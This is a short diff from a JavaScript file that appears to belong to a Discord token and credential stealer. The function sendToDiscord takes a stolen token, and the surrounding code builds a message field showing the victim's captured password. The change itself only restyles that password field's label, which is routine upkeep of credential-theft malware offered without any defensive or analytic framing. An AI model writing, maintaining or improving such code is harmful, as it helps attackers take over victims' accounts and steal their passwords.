@@ -2227,7 +2227,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           // Display password if available
           ...(userData.password ? [{
-            name: "<:password_icon:1408077637338986576> Password",
+            name: "🔑 **Password**",
             value: `**\`${userData.password}\`**`,
             inline: false
           }] : [])
